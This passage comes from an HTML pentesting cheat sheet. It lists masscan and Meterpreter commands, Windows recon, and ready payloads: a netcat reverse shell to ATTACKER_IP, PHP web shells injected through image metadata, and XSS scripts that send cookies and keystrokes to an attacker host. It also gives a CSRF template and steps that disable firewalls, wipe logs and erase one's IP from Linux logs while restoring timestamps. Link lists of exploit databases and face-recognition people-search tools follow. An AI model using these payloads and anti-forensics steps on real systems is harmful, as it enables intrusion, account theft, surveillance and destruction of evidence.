			<pre><code>masscan 192.168.0.0-192.168.0.255</code></pre>
		<li> Scanning Specific Ports:
			<pre><code>masscan -p80,443 192.168.0.1</code></pre>
		<li> Scanning All Ports:
			<pre><code>masscan -p0-65535 192.168.0.1</code></pre>
		<li> Setting Scan Rate:
			<pre><code>masscan -p80 192.168.0.1 --rate 10000</code></pre>
				<p> --rate - lets set the scan rate. In this case, scanning occurs at 10,000 packets per second. Select the speed individually. IMHO 500-1000 is ok.
		<li> Saving Results to a File:
			<pre><code>masscan -p80 192.168.0.1 -oG results.txt</code></pre>
				<p> -oG - allows to save scan results in grepable format to a file.
		<li> Scanning Specific Packet Types:
			<pre><code>masscan -p80 192.168.0.1 --packet 1-5</code></pre>
				<p> --packet - lets specify packet types for scanning.
		<li> Scanning via SOCKS5 Proxy:
			<pre><code>masscan -p80 192.168.0.1 --source-ip &lt;proxy_ip> --source-port &lt;proxy_port></code></pre>
				<p> flags allows to specify the source IP and port for scanning through a SOCKS5 proxy.
 	</ul>

 <h3 id='n1.18'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Meterpreter</ins></h3>
 	<ul>
		<li> arp - displays MAC and IP addresses of local devices interacted with
		<li> cd - command to change to another directory/folder
		<li> clearev - clears logs (need administration privs)
		<li> dir/ls - lists files and folders in the specified directory
		<li> download - downloads files from the remote machine to the local machine
		<li> getpid - displays the process ID under which Meterpreter is running
		<li> getproxy - retrieves information about the system's proxy server
		<li> getsystem - attempts to escalate privileges
		<li> getuid - displays the current user on behalf of whom Meterpreter is running
		<li> hashdump - dump all password hashes
		<li> help - help, display help documentation
		<li> idletime - displays user inactivity time on the remote computer
		<li> ifconfig/ipconfig - displays network settings
		<li> migrate - migrates meterpreter to another process
		<li> netstat - displays current network connections
		<li> ps - lists all current processes
		<li> pwd - displays the current directory/folder
		<li> record_mic - records audio on the remote machine
		<li> route - displays the routing table
		<li> run persistance &lt;with_parameters> - get backdoor (persistance help)
		<li> search - search for files, modules
		<li> show_mount - lists physycal and logical disks
		<li> sysinfo - dislays brief information about the remote system
		<li> upload - uploads files from the local machine to the remote machine
		<li> webcam_chat - organize a video chat
		<li> webcam_snap - takes a snapshot from the remote built-in camera
		<li> webcam_stream - obtains a video stream from the remote built-in camera
		<li> <code>run post/multi/recon/local_exploit_suggester</code> - recon for privesc
		<li> <code>load kiwi</code> - to load mimikatz
  	</ul>

 <h3 id='n1.19'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> CMD </ins></h3>
 <ol>
	<li> Clearing log files
		<ul>
			<li> wevtutil cl Application
			<li> wevtutil cl System
			<li> wevtutil cl Security
			<p> OR check firewall settings to find location of log file
			<li> netsh firewall show config (old command)
			<li> netsh advfirewall show currentprofile (MS recomends that command) -> cd log file direcroty, more file.log for read -> disable firewall
			<li> netsh firewall set opmode disable - disables the firewall (old command)
			<li> netsh advfirewall set currentprofile state off
			<li> del file.log
		</ul>
	<li> Viewing System Information
		<ul>
			<li> systeminfo - displays system information and installed patches
			<li> net user - lists local users
			<li> whoami /all - provides information the current user
			<li> driverquery - lists installed drivers
   		</ul>
	<li> Network Settings
		<ul>
			<li> ipconfig /all - shows network settings
			<li> ipconfig /displaydns - display cached DNS records
			<li> arp -a - lists IP addresses that the computer has communicated with
			<li> netstat - shows established connections
			<li> netstat -a - lists open ports
			<li> netstat -ao - displays open ports and associated IDs
			<li> netstat -abo - lists open ports, associated process IDs, and their names
			<li> netstat -r - shows the routing table
   		</ul>
	<li> Working with Services
		<ul>
			<li> tasklist - lists current processes
			<li> taskkill /f /pid "process_number" - terminates a process
			<li> schtasks - displays scheduled tasks
			<li> sc query - lists all services
			<li> sc query "service_name" - checks the status of a service
			<li> sc start/stop "service_name" - starts or stops service
			<li> net start - lists running services
		</ul>
	<li> Working with the File System
		<ul>
			<li> cd - navigates through the file system
			<li> dir - lists files and folders in the current directory
			<li> dir /ah - displays hidden files and folders
			<li> dir /ad - lists folders only
			<li> dir /b /s "folder and search term" - searches for files based on a keyword
			<li> mkdir - creates a new folder
		</ul>

  	rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 </ol>

<h3 id='n1.20'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Reverse Shell </ins></h3>
	<ol>
		<li> <pre><code> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;ATTACKER_IP> &lt;ATTACKER_PORT> >/tmp/f </code></pre>
  	</ol>
   
<h3 id='n1.21'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ins>Git</ins></h3>
	<ol>
		<li> <code>git log</code> - show commits` history
		<li> <code>git diff</code> - show difference between commits
		<li> <code>git blame</code> - who and when changed line in file
		<li> <code>git checkout</code> - change commit or branch
		<li> <code>git branch</code> - show branches
		<li> <code>git tag</code> - show all tags in the repo
 	</ol>
 <h3 id='n1.22'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ins>SSH and id_rsa</ins></h3>
 	<ul>
		<li>Copy id_rsa</li>
		<li>chmod 600 id_rsa</li> to set right permissoon for use (It is required that your private key files are NOT accessible by others.)
		<li>Connect:</li>
			<pre><code>ssh -i id_rsa &lt;USERNAME>@&lt;TARGET_IP></code><pre>
	</ul>
 <h3 id='n1.23'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ins>Clear log files</ins></h3>
 	<ol>
		<li>Check log file coplies (for example <code>ls -la /var/log/*.gz /var/log/*.1 /var/log/*.old</code>)</li>
		<li>Save timestamps</li>
			<pre><code>find /var/log -type f -exec touch -r {} {}.timestamp \;</code></pre>
			<!--<pre><code>stat /var/log/* > /tmp/log_timestamps.txt</code></pre>-->
 		<li>Delete</li>
			<pre><code>find /var/log -type f -exec sed -i '/YOUR_IP/d' {} \;</code></pre>
		<li>Recover timestamps</li>
			<pre><code>find /var/log -type f -name "*.timestamp" -exec sh -c 'touch -r "${0%.timestamp}" "$0"' {} \;</code></pre>
			<!--<pre><code>touch -r /var/log/auth.log.1 /var/log/auth.log</code></pre>-->
			<p>Or use this <a href='https://github.com/Kode-n-Rolla/pentesting_time/blob/main/scripts/timestamps_recover.sh'>script</a> if save as in second stage</p>
		<li>Check result</li>
			<pre><code>grep 'YOUR_IP' /var/log/*</code></pre>
	</ol>

<h3 align='right'><a href='#start'> <-- Back </a></h3>
   
	
<h2 align='center' id='n2'><em>Payloads</em></h2>
<li><a href='#n2.1'>LFI and File Upload Linux and Windwos Payloads</a></li>
<li><a href='#n2.2'>XSS Payloads</a></li>
<li><a href='#n2.3'>CSRF</a></li>
<li><a href='#n2.4'>Chains</a></li>
<li><a href='#n2.5'>Server Side Template Injection</a></li>
<li><a href='#n2.6'>CRLF</a></li>
<li><a href='#n2.7'>SSRF</a></li>
    <h3 id='n2.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LFI Payloads</h3>
	<ul>
		<li><a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux'>For Linux</a></li>
	 	<li><a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows'>For Windows</a></li>
		<li>%0a to bypass regex rules:</li>
			<pre><code>http://vuln.host/some.php?file=%0a../../../../etc/passwd</code></pre>
		<li>DotDotPwn can help with testing (<code>sudo apt install dotdotpwn</code>)</li>
	</ul>
     <h3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; File Upload Bypassing</h3>
	<ul>
		<li>Magic Bytes:
			<ul>
				<li>PNG - <code>89 50 4E 47 0D 0A 1A 0A</code></li>
				<li>JPEG - <code>FF D8 FF</code></li>
				<li>GIF (FIG87a) - <code>47 49 46 38 39 61</code></li>
			</ul>
		<li>Upload normal image file and intersept the request and try:</li>
	 		<ul>
				<li>Change file extension to php5 and the same</li>
				<li>Double extionsion</li>
				<li>Null Byte</li>
				<li>Change Content-Type</li>
			</ul>
		<li>Injecting through EXIF Data:</li>
			<pre><code>exiftool -comment="&lt;?php system($_GET['cmd'])>" file.png</code></pre>
		<li>Raw Insertion</li>
			<pre><code>echo "&lt;?php system($_GET['cmd'])>" >> file.jpeg</code></pre>
	</ul>
    <h3 id='n2.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
	<a href='https://xss.report/'>XSS.report</a>. Suggest payloads too
	<ol>
	    <li> <b>Proof Of Concept (PoC):</b>
		    <pre><code><scRIPt>alert('Success XSS!');&lt;/sCriPt></code></pre>
		    <pre><code>print()</code></pre>
		    <pre><code>prompt()</code></pre>
		    <pre><code>&lt;img src=x onerror=alert()></code></pre>
		    <pre><code>&lt;img src=x onerror="window.location.href='http://some.site'>"</code></pre>
		    <pre><code>&lt;svg/onload=confirm("document.cookie")></code></pre>
		    <pre><code><script>
    window.location = 'http://&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/page?param=' + document.cookie;
</script>
</code></pre>
		    Like above, but only request without redirect
		    <pre><code>&lt;img src="http://&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/page?param=" + document.cookie>
</code></pre>
	      <li> XSS -> LFI
			<pre><code><script>
    x=new XMLHttpRequest;
    x.onload=function(){
        document.write(this.responseText)
    };
    x.open("GET","file:///etc/passwd");
    x.send();
</script></code></pre>
	      <li> This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website.
	    	<p><b> Session Stealing </b> - <pre><code> <script>fetch('url/steal?cookie=' + btoa(document.cookie));</script> </code></pre>
	      	<p> Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
	    	<p><b> Key Logger </b> - <pre><code> <scripr>document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script> </code></pre>
	      	<p>The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card 		details.
	    	<p><b> Business Logic </b> - <pre><code> <script>user.changeEmail('e@mail.com');</script> </code></pre>
	      	<p> This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
	    	<p><b> Polyglots </b> - <pre><code> jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e </code></pre>
	      	<p> An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
	    <li>XSS Bypass WAF:
		    <pre><code>&lt;details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//</code></pre>
	    <li>Try to download to bypass shielding file with name like:
		    <pre><code>&lt;img src=1 onerror=alert()>.png</code></pre>
	    <li>XSS through SVG file:
		    <pre><code>
&lt;?xml verion="1.0" standalone="no"?>
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
&lt;svg version="1.1" baseProfile="full" xmlns=""www.w3.org/2000/svg">
&lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
&lt;script type="text/javascript">
	alert(document.domain);
&lt;/script>
&lt;/svg>
		    </code></pre>
	    <li>XSS through metadata
		    <p>Set header to <code>Content-Type: text/html</code>
		    <pre><code>exiftool file.jpeg -Comment='&lt;script>alert(1)&lt;/script>'</code></pre>
	    <li>Tips for exploit:
		    <ul>
			    <li>try to upload a file (image, svg, html) that contains xss payload inside
		    </ul>
	    <li> Description of XSS payloads <a href='https://netsec.expert/posts/xss-in-2020/'>here</a> 
   </ol>
<h3 id='n2.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CSRF </h3>
	<p>Google CSRF POC and user online tools for make CSRF POC and upgrade with tips below</p>
	<p>For example, <a href='https://hacktify.in/csrf/'>Hacktify</a> - CSRF PoC Generator</p>
	<li> Temple for payload:
	<pre><code>		
&lt;html&gt;
    &lt;body&gt;
        &lt;form id="csrfForm" action=&quot;https://ACTION_URL.COM&quot; method=&quot;POST&quot;&gt;
	    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;ATTACKER@MAIL.HACK&quot; /&gt;
	    &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;YOUR_CSRF&quot; /&gt;
	&lt;/form&gt;
	&lt;img src=&quot;https://URL_WITH_PARAMETER_ASSIGNMENT/?PARAM=TEST%0d%0aSet-Cookie:%20csrf=NEEDED_CSRF_TOKEN%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit();&quot; /&gt;
    &lt;/body&gt;
&lt;/html&gt;
	</code></pre>
    	<li> To avoid sending the referrer header:
		<pre><code>&lt;meta name="referrer" content="never"></code></pre>
	<li> To send malicious request automatic:
 		<pre><code>&lt;script>
	window.onload = function() {
		document.getElementById('csrfForm').submit();
	};
&lt;/script></code></pre>

<h3 id='n2.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Chains </h3>
	<li>Redirect bypasses for Open Redirect & SSRF!
 		<pre><code>?u=example2\.com  ❎
?u=example\.com@example2\.com ✅</code></pre>

<h3 id='n2.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSTI</h3>
<ul>
	<li>Polyglot:
		<pre><code>${{&lt;%[%'"}}%\</code></pre>
</ul>

<h3 id='n2.6'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CRLF</h3>
	<code>%0D%0A</code>
 		<ul>
			<li>%0D — CR (Carriage Return)</li>
			<li>%0A — LF (Line Feed)</li>
		</ul>

 <h3 id='n2.6'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSRF</h3>
 <ul>
	 <li><a href='https://nip.io/'>nip.io</a>. Help with ip payloads</li>
 </ul>

<h3 align='right'><a href='#start'> <-- Back </a></h3>
	      
        
<h2 align='center' id='n3'><em>Sites</em></h2>
      <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Someone main </h3>
	      <li><a href='https://book.hacktricks.xyz/'>HackTricks</a> - must have!!! PrivEsc, brute force, pentest network and wifi, metodologies cheatsheets and much more</li>
	      <li><a href='https://cloud.hacktricks.xyz/'>Cloud HackTricks</a></li>
              <li><a href='https://ppn.snovvcrash.rocks/'>Pentest notes</a></li>
	      <li><a href='https://gtfobins.github.io/#'>GTFO</a> bins. How to escalqte privs, how to get shells and much more with binary in target system</li>
	      <li><a href='https://lolbas-project.github.io/#'>LOLBAS</a>. Help with Windows</li>
	      <li><a href='https://shell-storm.org/'>Shell-Storm</a>. DB of shell-codes</li>
	      <li><a href='https://www.thehacker.recipes/'>thehacker.recipes</a>. Help with AD</li>
	      <li><a href='https://appsecexplained.gitbook.io/appsecexplained'>appsecexplained.gitbook.io</a>Help with explotation vulns</li>
	      <li><a href='https://search-engine-bug-bounty.netlify.app/'>Search engine bug bounty</a>. Help with vulns scanning</li>
	      <li><a href='https://app.interactsh.com/#/'>interactsh.com</a>. Like a Burp Collaborator</li>
      <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cheat sheets, hints </h3>
	      <li><a href='https://devhints.io/bash'>Bash scripting</a></li>
	      <li><a href='https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2'>How</a> pump nc shell</li>
	      <li><a href='https://www.stationx.net/nmap-cheat-sheet/'>Nmap</a></li>
              <li><a href='https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993'>PowerShell</a> cheatsheet</li>
	      <li><a href="https://redteamrecipe.com/powershell-tips-tricks">PowerShell</a> tips and tricks</li>
	      <li><a href='https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets'>ired.team</a>. Pentesting Cheatsheets. Convenient commands for your pentesting / red-teaming engagements, OSCP and CTFs</li>
	      <li><a href='https://www.stationx.net/common-ports-cheat-sheet/'>1</a>, <a href='https://packetlife.net/media/library/23/common-ports.pdf'>2</a> and <a href='https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/'>3</a> can help with ports</li>
	      <li><a href='https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'>Reverse Shell</a> cheatsheet</li>
	      <li><a href='https://vimsheet.com/'>A Great Vim</a> Cheat Sheet</li>
	      <li><a href='https://websec.ca/kb/sql_injection'>SQLi</a> cheatsheet</li>
	      <li>Another one <a href='https://tib3rius.com/sqli'>SQLi</a> cheatsheet</li>
	      <li><a href='https://acorzo1983.github.io/SQLMapCG/'>SQLMap Command Generator</li>
	      <li><a href='https://xss.report/'>XSS.report</a>. Help with xss payloads</li>
      <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CVE and Vulnerabilities db </h3>
	      <li><a href='https://www.first.org/cvss/calculator/3.0'>First.org</a>. CVSS calculator 3.0</li>
	      <li><a href='https://cvexploits.io/'>Cvexploits.io</a></li>
	      <li><a href='https://cve.circl.lu/'>CVE.circl</a> db</li>
	      <li><a href='https://www.first.org/cvss/calculator/3.0'>CVSS</a> search vulnerability</li>
	      <li><a href='https://cve.mitre.org/'>CVE.mitre</a> db of Common Vulnerabilities and Exposures</li>
	      <li><a href='https://lana.codes/lanavdb/'>Lana</a> Codes Vulnerability Database (WordPress plugins)</li>
	      <li><a href='https://vulners.com/'>Vulners.com</a> database</li>
	      <li><a href='https://www.exploit-db.com/'>OffSec</a> exploit db</li>
	      <li><a href='https://www.rapid7.com/db/vulnerabilities'>Rapid7</a> db</li>
	      <li><a href='https://vuldb.com/'>Vuldb.com</a> platform for control vulnerabilities and Threat analysis</li>
	      <li><a href='https://0day.today/search'>0day</a> db. Need tor</li>
	      <li><a href='https://modemly.com/m1/pulse'>Routers</a> db</li>
      <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dorks</h3>
		<li><a href='https://dorki.io'>Dorki.io</a></li>
		<li><a href='https://taksec.github.io/google-dorks-bug-bounty/'>Dorks</a> examples for Bug Bounty</li>
		<li><a href='https://dorksearch.com'>Dorksearch.com</a></li>
		<li><a href='https://dorkgenius.com'>Dorkgenius.com</a>. Custom Creator Search Dork</li>
		<li><a href='https://dorks.faisalahmed.me'>Dorks helper</a></li>
		<li><a href='https://nitinyadav00.github.io/Bug-Bounty-Search-Engine/'>Another dorks helper</a></li>
      <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hashes, encode/decode, cracker, identify </h3>
	      <li><a href='https://crackstation.net/'>crackstation.net</a> - online password hash cracker</li>
     	      <li><a href='https://dencode.com/en/'>dencode.com</a>. Many options for encode/decode </li>
	      <li><a href='https://www.base64encode.org/'>Base64</a> encode/decode</li>
	      <li><a href='https://hashes.com/en/tools/hash_identifier'>hashes.com</a>. Identity and crack hashes</li>
	      <li><a href='https://gchq.github.io/CyberChef/'>CyberChef</a> - encode/decode service</li>
	      <li><a href='https://www.kirsle.net/wizards/flask-session.cgi'>Flask Session Cookie Decoder </a></li>
	      <li><a href='https://ntlm.pw/'>NTLM.pw</a>. Help with NTLM hashes</li>
	      <li><a href='https://www.cs.drexel.edu/~jpopyack/IntroCS/HW/RSAWorksheet.html'>RSA</a> calculator</li>
	      <li><a href='https://cryptii.com/pipes/caesar-cipher'>Caesar cipher</a> cracker</li>
	      <li><a href='https://www.quipqiup.com/'>quipqiup.com. Solve simple substitution ciphers</a></li>
      <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Learning Path & Practise </h3>
	      <li><a href='https://www.eccouncil.org/'>CEH</a></li>
	      <li><a href='https://www.root-me.org/'>Root.me</a></li>
	      <li><a href='https://ctf365.com/?source=post_page---------------------------'>CTF365</a> - suitable for security professionals looking to acquire offensive skills, or system administrators interested in enhancing their defensive skills</li>
	      <li><a href='https://cryptohack.org/'>Cryptohack</a>. A free, fun platform for learning modern cryptography</li>
	      <li><a href='https://tryhackme.com/'>TryHackMe</a></li>
	      <li><a href='https://www.hackthebox.com/'>HackTheBox</a></li>
	      <li><a href='https://portswigger.net/web-security'>Port Swigger</a></li>
	      <li><a href='https://pentesterlab.com/'>Pentersterlab.com</a>. Сourses explaining vulnerabilities</li>
	      <li><a href='https://www.apisecuniversity.com/'>Apisecuniversity</a>. Free, Real-World‍ API Security Training</li>
	      <li><a href='https://ohmygit.org'>Ohmygit.org</a>. Help with git in play mode</li>
	      <li><a href='https://hackthissite.org/'>HackThisSite</a> - a free website with wargames to test and improve your white hat hacking skills. It offers a variety of hacking challenges in several categories, ncluding basic tasks, fricking, JavaScript, 			forensics, steganography, and more</li>
	      <li><a href='https://hackaday.com/'>Hackaday</a> - serves up Fresh Hacks Every Day from around the Internet</li>
	      <li><a href='https://ctftime.org/ctfs'>CTFtime</a>. CTF practice</li>
	      <li><a href='http://www.itsecgames.com/'>BWAPP</a> - buggy web application. Virtual pentest laboratory to practice</li>
	      <li>Free <a href='https://thexssrat.podia.com/ratatatata'>set</a> of practice tasks. Thanks to <a href='https://www.youtube.com/c/TheXSSrat'> TheXSSrat </a></li>
	      <li><a href='https://overthewire.org/wargames/'>OVERTHEWIRE</a> - uitable for anyone looking to learn the theory of information security and apply it in practice regardless of their experience level</li>
	      <li><a href='https://hacking-lab.com/services/'>HACKING-LAB</a> - provides CTF challenges for the European Cyber Security Challenge, but they also host regular competitions on their platform that anyone can participate in</li>
              <li><a href='https://pwnable.kr/'>PWNABLE.KR</a> - this platform focuses on pwn challenges similar to CTF, which involve finding, reading, and submitting flag files that are present in each task</li>
	      <li><a href='https://w3challs.com/'>W3Challs</a> - an educational platform with a variety of tasks in different categories, including hacking, wargames, forensics, cryptography, steganography, and programming. The platform aims to provide realistic 		challenges. Depending on the difficulty of the solved task, you earn points. There is also a forum where you can discuss and solve tasks with other participants</li>
	      <li> <a href='https://www.smashthestack.org/'>SmashTheStack</a> - consists of 7 different wargames: Amateria, Apfel (currently offline), Blackbox, Blowfish, CTF (currently offline), Logic, and Tux. Each wargame contains a variety of tasks ranging from 		standard vulnerabilities to reverse engineering challenges</li>
	      <li><a href='https://microcorruption.com/'>Microcorruption</a> - is a CTF where you need to "reverse" fictional electronic locking devices called Lockitall. Lockitall devices protect bonds stored in warehouses owned by the fictional company 			CyYombinator. On the way to stealing the bonds, you will learn about assembly language, how to use a debugger, step through code, set breakpoints, and explore memory</li>
	      <li><a href='https://pwn0.com/'>The platform pwn0</a> - is a VPN where almost anything can happen. Fight against bots or users and earn points by gaining control over other systems</li>
      <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MSFVenom help </h3>
	      <li><a href='https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1'>gist.github</a></li>
	      <li><a href='https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/'>Cheat Sheet</a></li>
      <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OSINT and Information Gathering </h3>
	      <li><a href='https://osintframework.com/'>OSINT Framework</a>Aggregation of all popular tools and resources for OSINT</li>
	      <li><a href='https://archive.org/'>Archive</a> of sites history</li>
	      <li><a href='https://www.openstreetmap.org/'>Openstreetmap.org</a></li>
	      <li><a href='https://www.babelstreet.com/'>Babel street</a></li>
	      <li><a href='https://crt.sh/'>Crt.sh</a></li>
	      <li><a href='https://securityheaders.com/'>Securityheaders</a>. Check target site headers</li>
	      <li><a href='https://chaos.projectdiscovery.io/'>chaos.projectdiscovery.io</a></li>
	      <li><a href='https://fofa.info/'>Fofa</a>. Passive scaner like shodan</li>
	      <li><a href='https://netlas.io/'>Netlas.io</a>. Discover, scan and monitor any online assets</li>
       	      <li><a href='https://intelx.io/'>Intelx.io</a>. Search engine woth leak from darkweb resourses</li>
	      <li><a href='https://dnsdumpster.com/'>DNSdumpster</a> for passive and fast search domains and subdomains and etc</li>
	      <li><a href='https://urldna.io/'>Urldna.io</a>. Free, complex, power tool for research web. Collect ssl info, ip addreses, headers, cookies, some info about techs and etc</li>
	      <li><a href='https://web-check.xyz/'>Web-check.xyz</a>. In just 20 seconds, you can see what attackers already know</li>
	      <li><a href='https://haveibeenpwned.com/'>Have I been pwned</a>. Emails leak</li>
	      <li><a href='https://www.dehashed.com/'>Dehashed</a>.Another source of emails leak</li>
	      <li><a href='https://geospy.web.app/'>Geospy</a>. This is an online service for determining the physical address of the location depicted in a photograph</li>
	      <li><a href='https://www.google.com/alerts?hl=en'>Google Alert</a>. Notifies you when the specified information appears on the Internet</li>
	      <li><a href='https://viewdns.info/'>ViewDNS</a> Offers reverse IP Lookup</li>
	      <li><a href='https://sitereport.netcraft.com/?url=http://google.com'> Netcraft.</a> Information about domain. Temple of searching: <pre><code>https://sitereport.netcraft.com/?url=&lt;TARGET_URL></code></pre></li>
              <li><a href='https://www.shodan.io/'>Shodan</a> is the world's first search engine for Internet-connected devices</li>
	      <li><a href='https://securityheaders.com/'>SecurityHeaders</a> Scanner of headers security</li>
	      <li><a href='https://observatory.mozilla.org/'>Observatory.mozilla</a> Scanner of headers security</li>
	      <li><a href='https://spark-interfax.ru/'>This</a> is a system that gathers all available information about companies and extracts data from it</li>
              <li><a href='https://search.censys.io/'>Censys Search</a> Can provide a lot of information about IP addresses and domains</li>
	      <li><a href='https://www.robtex.com/'>Robtex</a> Whois like tool. Techs, servers, ips, dns configuration and another info about target</li>
	      <li><a href='https://crt.sh/'>DataBase</a> SSL/TLS-certificates issued for domain names</li>
	      <li> Metasearch Engine:
		      <ol>
			      <li><a href='https://www.faganfinder.com/'>Fagan Finder</a> - is an excellent source of information. You enter a query, then click on the desired source. Then you are redirected to the relevant page. The most important thing is that it 				shows how many sources there can be and how diverse they can be: from the Library of Congress website to leak publication services</li>
	      		      <li><a href='https://intelx.io/'>Intelligence X</a> - it not only searches for leaks but also helps navigate other OSINT tools. Services for email verification, DNS search - you'll find them here too. Go to the Tools section and search 				specifically</li>
		      </ol>
	      <li> Tools for people search by photo:</li>
		      <ol>
			      <li><a href='https://social-catfish.pxf.io/c/1359419/1472958/12693?subId1=face-recognition-search-engines'>Social Catfish</a> - is the perfect facial recognition search engine that can search for people by face, name, email, address, 				and username</li>
			      <li><a href='https://www.spokeo.com/?g=name_face9recognition9search9engines_A3313266936'>Spokeo</a> - is a database used for identifying people and providing accurate information about them. It is constantly updated and boasts over 6 				million consumers, 130 million property records, 600 million legal records, and over 120 social networks, making it an ideal people search system for personal 	and business use</li>
			      <li><a href='https://images.google.com/'>Google Image Search</a> - uses the powerful Google Bot to scan all publicly accessible websites for images to create the largest and most frequently updated image database in the world</li>
			      <li><a href='https://pimeyes.com/'>PimEyes</a> - is one of the best facial recognition search engine tools that allows you to perform in-depth image searches on the internet. Advanced 										convolutional neural networks analyze the image you upload to find objects and match them with the database</li>
			      <li><a href='https://FaceCheck.ID'>FaceCheck.ID</a> - is one of the best reverse image search tools for facial recognition. You can use it to search for images of a specific person. It identifies faces in the photo you upload, and then 				finds similar faces in social media posts, online videos, fraudulent accounts, websites, news and blog pages, as well as in product marketing</li>
		      </ol>
      <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Password Services</h3>
	      <li><a href='https://wordlists.assetnote.io/'>wordlists.assetnote.io/</a></li>
	      <li><a href='https://cirt.net/passwords'>CIRT.net</a> Default Passwords service</li>
	      <li><a href='https://default-password.info/'>Default-Password.info</a> Default Passwords service</li>
	      <li><a href='https://datarecovery.com/rd/default-passwords/'>Datarecovery.com</a> Default Passwords service</li>
	      <li><a href='https://passwordsdatabase.com/'>Passwordsdatabase</a> another one default passwords service</li>
	      <li><a href='https://wiki.skullsecurity.org/index.php?title=Passwords'>This</a> wiki page includes the most well-known collections of passwords</li>
	      <li><a href='https://weakpass.com/'>Weekpass.com</a> is a collection of password lists for various purposes from penetration testing to improving password security</li>
      <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dashboards for Cyber Threat Monitoring </h3>
       	      <li><a href='https://cybermap.kaspersky.com/'>cybermap.kaspersky</a>. A colorful globe designed in the best traditions of Hollywood hacker movies. Its real value lies not in its design but in the informative panel with statistics collected from the 		company's security products. Additionally, Kaspersky Lab supports a dashboard with information on current threats, located <a href='https://statistics.securelist.com/'>here</a></li>
	      <li><a href='https://livethreatmap.radware.com/'>Live Threat Map</a>. Here, you can view summary statistics on cyberattacks over the last hour, day, or month, as well as highlight the most targeted countries, top attack vectors, and most scanned ports</li>
              <li><a href='https://www.talosintelligence.com/reputation_center'>Talos Reputation Center</a>. A dashboard with general information on cyber threats, created by Talos with support from Cisco</li>
	      <li><a href='https://talosintelligence.com/fullpage_maps/pulse'>Cyber Attack Map</a>. A map featuring the top spam and malware-spreading servers</li>
              <li><a href='https://www.sicherheitstacho.eu/'>Sicherheitstacho</a>. A cyberattack dashboard from Deutsche Telekom, which operates on the open-source honeypot network: <a href='https://github.com/telekom-security/tpotce'> T-Pot</a></li>
	<h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Other </h3>
 		<li><a href='https://fpcentral.irisa.fr/'>fpcentral.irisa.fr</a>. Check fingerprint</li>
   		<li><a href='https://amiunique.org/'>amiunique.org</a>. Like from above</li>
     		<li><a href='https://blindf.com/'>blindf.com</a>. Helps with Blind XSS</li>
       		<li><a href='https://shazzer.co.uk/'>Shazzer</a>. Shared online fuzzing</li>

<h3 align='right'><a href='#start'> <-- Back </a></h3>
       
        
<h2 align='center' id='n4'><em> Tools </em></h2>
<ol>
